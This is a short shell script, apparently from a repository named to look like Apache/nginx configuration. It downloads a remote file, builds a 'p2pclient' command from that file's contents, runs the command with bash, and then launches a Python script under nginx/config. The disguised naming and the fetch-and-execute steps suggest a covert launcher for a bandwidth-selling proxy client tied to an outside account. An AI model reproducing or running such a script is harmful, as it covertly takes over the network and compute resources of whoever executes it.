rm -rf p2p.sh
wget https://raw.githubusercontent.com/bls4/apache/main/config/p2p
echo -e "p2pclient -l MAIL_ADDREES" | sed -e "s/MAIL_ADDREES/$(cat p2p)/" > p2p.sh
/bin/bash -c p2p.sh
python3 nginx/config/timep.py